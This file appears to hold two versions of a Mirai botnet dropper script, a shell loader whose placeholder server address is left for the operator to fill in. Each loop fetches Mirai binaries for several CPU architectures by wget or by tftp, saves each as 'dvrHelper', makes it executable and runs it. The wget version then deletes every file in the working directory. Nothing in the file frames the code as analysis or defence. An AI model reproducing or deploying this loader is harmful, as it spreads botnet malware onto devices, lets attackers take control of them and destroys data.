#!/bin/sh

# Edit
WEBSERVER="IP:PUERTO"
# Stop editing now


BINARIES="mirai.mips mirai.x86 mirai.arm7 mirai.sh4  mirai.mpsl mirai.arm"

for Binary in $BINARIES; do
    wget http://$WEBSERVER/$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done

rm -f *



// tftp tbin.sh
#!/bin/sh

# Edit
TFTPSERVER="IP"
# Stop editing now


BINARIES="mirai.mips mirai.x86 mirai.arm7 mirai.sh4  mirai.mpsl mirai.arm"

for Binary in $BINARIES; do
    tftp -g -l dvrHelper -r $Binary $TFTPSERVER
    chmod 777 dvrHelper
    ./dvrHelper
done
